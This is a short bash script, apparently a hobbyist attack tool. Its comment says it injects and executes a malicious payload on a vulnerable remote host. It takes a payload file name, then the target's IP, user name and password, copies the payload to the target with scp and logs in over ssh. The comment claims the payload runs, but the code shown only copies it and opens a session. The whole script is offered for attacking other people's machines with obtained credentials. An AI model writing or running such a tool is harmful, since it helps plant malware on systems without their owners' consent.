#!/bin/bash
# Injects and executes a malicious payload into a vulnerable remote host

clear

echo -n "Enter payload's name: "
read PAYLOAD
echo -e "\nSearching for $PAYLOAD payload..."
if [ -f payload/$PAYLOAD ]
then
	echo -e "$PAYLOAD payload loaded successfully!\n"
else
	echo "Failed: Unable to find $PAYLOAD payload. Exiting..."
	exit 1
fi
echo -n "Enter nub's IP: "
read IP
echo -n "Enter nub's vulnerable user: "
read USER
echo -n "Enter nub's password: "
read PASSWORD

# Inject
scp payload/$PAYLOAD $USER@$IP:
ssh $USER@$IP
